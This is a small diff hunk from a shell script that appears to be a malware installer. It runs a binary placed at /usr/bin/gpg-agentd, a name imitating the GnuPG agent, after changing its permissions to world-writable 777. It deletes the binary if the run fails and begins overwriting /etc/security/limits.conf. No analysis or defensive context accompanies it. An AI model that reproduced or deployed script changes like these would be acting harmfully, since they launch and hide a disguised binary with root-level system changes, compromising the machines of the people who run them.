@@ -45,7 +45,7 @@ fi
 sleep 2
 if [ -f /usr/bin/gpg-agentd ]; then
         cd /usr/bin
-        chmod a+x gpg-agentd && ./gpg-agentd || rm -rf gpg-agentd
+        chmod 777 gpg-agentd && ./gpg-agentd || rm -rf gpg-agentd
 fi
 sleep 1
 cat <<EOF> /etc/security/limits.conf
